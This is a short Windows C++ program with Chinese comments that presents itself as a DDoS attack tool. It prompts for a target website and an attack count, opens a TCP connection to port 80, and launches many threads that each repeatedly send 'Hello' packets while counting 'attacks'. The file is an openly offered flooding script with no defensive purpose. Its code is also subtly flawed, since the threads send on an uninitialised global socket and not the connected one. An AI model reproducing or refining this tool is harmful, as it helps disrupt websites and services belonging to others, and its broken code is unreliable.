#include <stdio.h>
#include <WinSock2.h>           //网络编程
#include <iostream>
#pragma comment(lib , "ws2_32.lib")     

//DDOS攻击

DWORD WINAPI WorkProc(LPVOID lpParam);

SOCKET sockClient;

int main()
{
  //1.输入肉鸡官网链接

  char url[200];      //存储肉鸡官网链接
  printf("请输入肉鸡官网链接：\n");
  scanf("%s", url);

  //2.设置攻击次数
  int n;
  printf("请输入攻击次数:\n");
  scanf("%d", &n);

  //3.初始化网络
  WSADATA wd;
  if (0 != WSAStartup(MAKEWORD(2, 2), &wd))
  {
    printf("初始化网络失败.\n");
    return 0;
  }

  //4.判断是否加载的是我请求的版本
  if (LOBYTE(wd.wVersion) != 2 || HIBYTE(wd.wVersion) !=2 )
  {
    printf("请求的版本与实际加载的版本不一致.\n");
    return 0;
  }

  //5.创建套接字
  SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
  if (sockClient == INVALID_SOCKET)
  {
    printf("创建套接字失败.\n");
    return 0;
  }


  //6.将域名解析成IP地址
  hostent* host = gethostbyname(url);
  if (host == NULL)
  {
    printf("域名解析失败.\n");
    return 0;
  }

  //7.连接服务器
  sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(80);
  memcpy(&sa.sin_addr, host->h_addr, 4);

  if (SOCKET_ERROR == connect(sockClient, (sockaddr*)&sa, sizeof(sockaddr)))
  {
    printf("连接网站失败.\n");
  }

  //8.测试，通讯
  //HTTP协议
  //char sendBuf[250] = {0};
  //sprintf(sendBuf, "Hello\r\n\r\n");
  //char recvBuf[512] = {0};
  //发送
  //send(sockClient, sendBuf, strlen(sendBuf), 0);
  //接受
  //char ch='\0';
  //std::string str;
  //while (recv(sockClient, &ch, sizeof(ch), 0))
  //{
  //  str = str + ch;
  //}

  //9.DDOS攻击
  char sendBuf[250] = "Hello\r\n\r\n";//发包内容自行更改，\r\n不能删代表发送完毕否则会一直等待
  int i = 0;
  while (i < n)
  {
    CreateThread(NULL, 0, WorkProc, 0, 0, NULL);
    i++;
  }

  //HTTP协议
  
  
  system("pause");
  
  //printf("%s\n", str.c_str());

  return 0;
}

DWORD WINAPI WorkProc(LPVOID lpParam)
{
  int i = 0;
  while (i < 5000)
  {
    printf("攻击了：%d次\n", i);
    char sendBuf[250] = "Hello";
    send(sockClient, sendBuf, strlen(sendBuf), 0);
    i++;
  }

  return 0;
}
